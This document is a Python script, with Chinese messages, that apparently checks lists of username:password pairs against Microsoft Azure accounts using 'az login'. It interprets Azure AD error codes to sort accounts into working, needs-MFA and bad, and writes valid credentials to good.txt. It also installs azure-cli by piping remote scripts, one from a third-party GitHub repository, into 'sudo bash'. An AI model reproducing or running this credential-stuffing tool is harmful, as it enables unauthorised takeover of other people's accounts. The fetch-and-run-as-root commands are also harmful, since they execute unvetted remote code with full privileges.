# -*- coding: UTF-8 -*-
import os
import platform
import subprocess
import datetime
import numpy as np
import pandas as pd
import threading

######  acc  part
accs = np.array(pd.read_table("./acc.txt", dtype=str, sep=':', usecols=(0, 1), encoding='utf-8', skip_blank_lines=True, header=None))


def run():
    if test_azurecli() == 'true':
        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 开始运行')
        for acc in accs:
            try:
                if get_status(acc) == '密码正确':
                    print(acc[0] + ':' + acc[1] + ' good')
                    good = acc[0] + ':' + acc[1]
                    with open('./good.txt', 'a', encoding='utf-8') as fa:
                        fa.write(good)
                        fa.write('\n')
                elif get_status(acc) == '需要添加二验':
                    print(acc[0] + ':' + acc[1] + ' manual')
                    manual = acc[0] + ':' + acc[1]
                    with open('./manual.txt', 'a', encoding='utf-8') as fa:
                        fa.write(manual)
                        fa.write('\n')
                else:
                    print(acc[0] + ':' + acc[1] + ' bad')
            except Exception as e:
                pass
        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 完成运行')
    else:
        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 运行结束')


def get_status(acc):
    shell_content = 'az login --allow-no-subscriptions ' + acc[0] + ' -p ' + acc[1]
    status = subprocess.getoutput(shell_content)
    # print(status)
    if 'true' in str(status):
        return '密码正确'
    elif '50034' in str(status):
        return '账户不存在'
    elif '50126' in str(status):
        return '密码错误'
    elif '53003' in str(status):
        return 'IP限制'
    elif '50057' in str(status):
        return '管理ban'
    elif '50059' in str(status):
        return '被删号'
    elif '50053' in str(status):
        return '被暴力破解，自动ban'
    elif '90019' in str(status):
        return '账号错误'
    elif '50076' in str(status):
        return '需要二验'
    elif '50079' in str(status):
        return '需要添加二验'
    else:
        print(status)
        return '未知错误'


def test_azurecli():
    try:
        az_ver = subprocess.check_output('az -v', shell=True)
    except Exception as e:
        az_ver = '0'

    if 'core' in str(az_ver):
        print('azure-cli环境正常')
        return 'true'
    else:
        print('azure-cli未安装，尝试自动安装...')
        sys_ver = str(platform.uname())
        if 'Debian' in sys_ver or 'Ubuntu' in sys_ver:
            os.system('curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash')
        elif 'Centos' in sys_ver or 'Redhat' in sys_ver or 'Fedora' in str(sys_ver):
            print('此系统下安装azure-cli包很大，建议换成Ubuntu，但依然尝试安装')
            os.system('curl -sL https://raw.githubusercontent.com/xcgx/office365-cli/main/azure-cli-install-CentOS1.sh | sudo bash')
        else:
            print('系统为Windows或其他系统，请手动安装https://docs.azure.cn/zh-cn/cli/install-azure-cli-windows?view=azure-cli-latest&tabs=azure-cli')
            return 'false'
    try:
        az_ver = subprocess.check_output('az -v', shell=True)
    except Exception as e:
        az_ver = '0'

    if 'core' in str(az_ver):
        print('当前azure-cli环境正常，将继续运行')
        return 'true'
    else:
        print('azure-cli自动安装失败，请手动安装')

try:
    threading.Thread(target=run, args=()).start()
except Exception as error:
    print("retry")
